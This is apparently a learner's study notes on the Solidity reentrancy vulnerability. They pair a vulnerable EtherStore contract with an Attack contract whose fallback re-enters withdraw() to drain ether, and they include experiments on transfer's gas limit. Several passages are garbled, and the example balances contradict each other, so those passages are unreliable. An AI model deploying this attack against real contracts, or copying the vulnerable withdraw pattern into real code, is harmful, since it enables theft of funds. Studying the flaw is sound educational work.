# Re-Entrancy

Reentrancy is a vulnerability that occurs when a contract calls an external contract, and the external contract calls back into the first contract before the first contract has finished executing. This can lead to unintended behavior and can be exploited by attackers to drain funds from the contract, for example.

There are two contracts Contract A and Contract B.

Contract A : Contract A is a smart contract that holds user funds and allows users to withdraw them. It may contain functions for checking balances, transferring funds, and verifying that the sender of a transaction has sufficient funds. The structure of the contract's withdraw function is shown in the image below:

re-entrance-1.jpg

According to the image, `Contract A` has `50 Ether` in funds. The `withdraw()` function first checks whether the user's balance is greater than `zero`. If it is, the contract sends the associated funds to the user and sets the user's balance to zero. For example, let's say `Bob` has a balance of `20 Ether` stored in this contract and wants to withdraw his funds. He can use the contract's `withdraw` function to request the funds. The function will check if `Bob` has a balance stored in the contract (he does, with 20 Ether). The contract will then send the balance back to `Bob`, reducing the contract's balance to `30 Ether` (`50 Ether` minus `20 Ether`). Finally, the contract sets Bob's balance to `zero`. This is how the withdraw function works.

Now lets see how contract B can use the re-entrancy to exploit withdraw function of contract A:

Contract function need to be two functions first is fallback function and function name attack. BOth function going to call the widthdraw function inside contract A. Now the execution of it work like this:

First Alice call the attack function, this will cal the withdraw function inside the contractg A.
first Eid caused attack function this call the withdrawal function inside contract A since contract B is the caller here it checks that the balance of contract B is greater than 0 and it is since here contract B as one either so it sends that one either back to contract B. and when it does inside contract B it triggers the fallback function so now contract B as one ether and contact A has nine either now the fallback function inside contract B calls back into the withdrawal function inside contact A and then it checks the balance of contract B this is the balance of contract be greater than 0 if you look above you can see that the balance of contract B is still one either so this check passes and it sends another eater back to contract B which triggers the fallback function and now contract B has two eaters and contract a has eight eaters while the balance of contract be inside contract a is still equal to one liter so this means that while the balance of contract B is now updated it can keep withdrawing either from contract a and this could keep on going since the balance is updated on the last line of the withdrawal function but it is not reached since it keeps on looping between the fallback function and the withdrawal function and this is how contract beat and keep on withdrawing eater.


The withdraw() function of Contract A allows users to retrieve their stored funds if they have a balance greater than zero. For example, let's say Bob has a balance of 20 Ether in Contract A and wants to withdraw his funds. He can use the withdraw() function, which will check that Bob has a balance in the contract and then send it back to him. This will reduce the balance of Contract A by 20 Ether, bringing it down to 30 Ether, and set Bob's balance to zero.

Contract B can exploit the withdraw() function of Contract A through a technique called re-entrancy. Contract B has two functions: a fallback function and a function called `attack`. Both of these functions will call the `withdraw()` function within `Contract A`. and contract A have 10 ether funds of contract B. and Contract B has balance zero.

Here's how the attack will work: 

re-entrance-2.jpg

Alice calls the` attack()` function, which in turn calls the `withdraw()` function in `Contract A`. `Contract A` checks that `Contract B` has a `balance` greater than `zero`.

re-entrance-3.jpg

Which it does (it has 10 Ether), and sends it back to Contract B when it does inside contract B it triggers the fallback function and now contract B has 10 ether. thorugh which now contract B has 10 ether and contract A reduces the balance to 40 ether.

re-entrance-4.jpg

the fallback function of contract B calls the withdraw() function in Contract A again. Contract A again checks that Contract B has a balance greater than zero, which it does (it now has 10 Ether still), and sends it another Ether.

re-entrance-5.jpg

Now contract has 20 ether and contract A have 30 ether.

This process can repeat, with the fallback function in Contract B calling the withdraw() function in Contract A over and over. Each time, Contract A sends more funds to Contract B, and the balance of Contract A decreases, while Contract B's balance increases. This is how Contract B can continuously exploit the withdraw() function of Contract A.


Contract B: 

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

//checking  How much function stack stores?
// contract A{
//     uint public count;
//     function fun() public {
//         uint a;
//     }

//     function fun2() public{
//         count++;
//             fun();
//     }
// }
// contract A{
//     function deposit() public payable{

//     }
    
//     function withdraw() public {
//         uint amount = 2 ether;
//         payable(msg.sender).transfer(amount);
//     }
// }

// contract B {
//     A public contractA;
//     constructor(address _addr) {
//         contractA = A(_addr);
//     }

//     fallback() external payable{

//     }

//     function attack() public{
//         contractA.withdraw();
//     }
// }

//working below
// contract EtherStore {
//     mapping(address => uint) public balances;

//     function deposit() public payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() public {
//         uint bal = balances[msg.sender];
//         require(bal > 0);

//         (bool sent, ) = msg.sender.call{value: bal}("");
//         require(sent, "Failed to send Ether");

//         balances[msg.sender] = 0;
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

// contract Attack {
//     uint public count;
//     EtherStore public etherStore;

//     constructor(address _etherStoreAddress) {

//         etherStore = EtherStore(_etherStoreAddress);
//     }

//     // Fallback is called when EtherStore sends Ether to this contract.
//     fallback() external payable {
//         if (address(etherStore).balance >= 1 ether && count<=5) {
//             count++;
//             etherStore.withdraw();
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether);
//         etherStore.deposit{value: 1 ether}();
//         etherStore.withdraw();
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }
//Working above:

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        // payable(msg.sender).transfer(bal); //Not working
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    uint public count;
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {

        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether && count<=5) {
            count++;
            etherStore.withdraw();
        }
    }

    function deposit() public payable{

    }

    function depositD() public payable{
        etherStore.deposit{value: msg.value}();
        // etherStore.deposit(); // this will not work. if you want to send msg.value to another contract 
    }

    function attack() external payable {
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//Not working becuz of count++ , if you remove it works.
// contract EtherStore {
//     mapping(address => uint) public balances;

//     function deposit() public payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() public {
//         uint bal = balances[msg.sender];
//         require(bal > 0,"balance does not exist!");
//         payable(msg.sender).transfer(bal);
//         balances[msg.sender] = 0;
//     }

//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

// contract Attack {
//     uint public count = 0;
//     EtherStore public etherStore;

//     constructor(address _etherStoreAddress) {
//         etherStore = EtherStore(_etherStoreAddress);
//     }

//     fallback() external payable {
//         if (address(etherStore).balance >= 1) {
//             count++;
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether);
//         etherStore.deposit{value: 1 ether}();
//         etherStore.withdraw();
//     }

//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

// contract EtherStore {
//     mapping(address => uint) public balances;
//     function deposit() public payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() public {
//         uint bal = balances[msg.sender];
//         require(bal > 0,"balance is not");

//         payable(msg.sender).transfer(bal);
//         // (bool sent, ) = msg.sender.call{value: bal}("");
//         // require(sent, "Failed to send Ether");

//         balances[msg.sender] = 0;
//     }

//     function withdraw2() public {
//         uint bal = balances[msg.sender];
//         require(bal > 0,"you do not have baance");

//         payable(msg.sender).transfer(bal);
//         // (bool sent, ) = msg.sender.call{value: bal}("");
//         // require(sent, "Failed to send Ether");

//         balances[msg.sender] = 0;
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }

// contract Attack {
//     EtherStore public etherStore;
//     uint a = 0;

//     constructor(address _etherStoreAddress) {
//         etherStore = EtherStore(_etherStoreAddress);
//     }

//     // Fallback is called when EtherStore sends Ether to this contract.
//     fallback() external payable {
//         if (address(etherStore).balance >= 1 ether && a <= 2) {
//             etherStore.withdraw();
//         }
//         a++;
        
//     }

//     function d() public payable{

//     }

//     function deposit() public{
//         etherStore.deposit{value: 1 ether}();
//     }

//     function attack() public payable{
//         etherStore.withdraw();
//     }

//     // function attack2() public {
//     //     // require(msg.value >= 1 ether);
//     //     // etherStore.deposit{value: 1 ether}();
//     //     etherStore.withdraw2();
//     // }


//     // // Helper function to check the balance of this contract
//     // function getBalance() public view returns (uint) {
//     //     return address(this).balance;
//     // }
// }

// // contract FundStore{
// //     mapping(address => uint) public funds;

// //     function deposit() public payable{
// //         require(msg.value>0,"ether should be grater than zero");
// //         funds[msg.sender] += msg.value;
// //     }

// //     function withdraw() public{
// //         require(funds[msg.sender] > 0, "You do not have any funds");
// //         payable(msg.sender).transfer(funds[msg.sender]);
// //         funds[msg.sender] = 0;
// //     }

// // }

// // contract Attack{
// // //    function receive(address _addr) external payable {
// // //         (bool sucess,) = _addr.call(abi.encodeWithSignature("withdraw()"));
// // //     }
// //     FundStore fs = new FundStore();
// //     fallback() external payable{
// //         fs.withdraw();
// //     }

// //     receive() payable external{

// //     }
// //     // function deposit(uint amount,address _addr) public{
// //     //     // f.deposit(a);
// //     //     amount = amount * 1 ether;
// //     //     (bool sucess,) = _addr.call{value: amount}(abi.encodeWithSignature("deposit()"));
// //     // }

// //     function attack() public payable{
// //         // (bool sucess,) = _addr.call(abi.encodeWithSignature("withdraw()"));
// //         fs.deposit{value : 1 ether}();
// //         fs.withdraw();
// //     }


// // }

// // to transfer u dont need payable function 
// // deposit money using msg.value
// // tranfer money using call low level function
// // How to update the contract balance in a function 
// when you call deposit of contract A, you should specifiy the {value: 1 ether} otherwise you getting error, remix value portion will not work.

```

```
contract A {
    address public contractB;
    constructor(address _addr){
        contractB = _addr;
    }

    function deposit() public payable {
    }

    function withdraw() public {
        uint bal = 1 ether;
        payable(contractB).transfer(bal);
    }
}

contract B {
    uint public count;
    fallback() external payable {
        count = 1;
    }
}
```
Follow the following steps:
1. Deploy `contract B`.
2. Deploy `contract A` by passing the address of `contract B` as a constructor argument.
3. Send more than `1 ether` to `contract A` using the `deposit` function.
4. Call the `withdraw` function in `contract A` which transfers `1 ether` to `contract B` using the `transfer` function.
5. Observe that the `transaction` fails 

what's the reason for the failure?

By doing some minor changes in code, transcation is succussfull. 
**scenerio 1:**

- Replace the `transfer` function in the `withdraw` function of `contract A` with the `call` function.
```sol
function withdraw() public {
    uint bal = 1 ether;
    // payable(contractB).transfer(bal);
    (bool sent, ) = msg.sender.call{value: bal}("");
}
```

- Repeat `steps 1-4` and observe that the `transaction` is successful.
- Observe that the `transaction` success by using just a `call` function.

**scenerio 2:**
- Use `trasfer` function again in the `withdraw` function (remove call function that we have update in scenerio 1).
- Remove the `count` increment in the `fallback` function of `contract B`.
- Repeat `steps 1-4` and observe that the transaction is successful.

As per above two scenerios i observe that if we use taransaction function to send the funds from contract A to contract B. then we can not update the state variable. But i did not find any concept on solidity documentation.

Please explain what i am missing here?



scenario 2:
Replace the transaction function to `call` low-level function.  Now the updated code is following
```
contract A {
    address public contractB;
    constructor(address _addr){
        contractB = _addr;
    }

    function deposit() public payable {
    }

    function withdraw() public {
        uint bal = 1 ether;
        // payable(contractB).transfer(bal);
        (bool sent, ) = msg.sender.call{value: bal}("");
    }
}

contract B {
    uint public count;
    fallback() external payable {
        count = 1;
    }
}```
Follow the steps of scenario 1. Now the `Tx` has been successful. Why?

scenario 3:
1. Remove the count = 1 from fallback function. Now the code is:
```
contract A {
    address public contractB;
    constructor(address _addr){
        contractB = _addr;
    }

    function deposit() public payable {
    }

    function withdraw() public {
        uint bal = 1 ether;
        payable(contractB).transfer(bal);
    }
}

contract B {
    uint public count;
    fallback() external payable {
        // count = 1;
    }
}
```

2. And follow the steps in scenario 1.
Now `Tx` has been successful. why? GOT the ansers:  **It have a hardcoded 2300 gas limit, which doesn't allow any fallback/functions to execute**


//https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0

list of bugs , POCs

https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/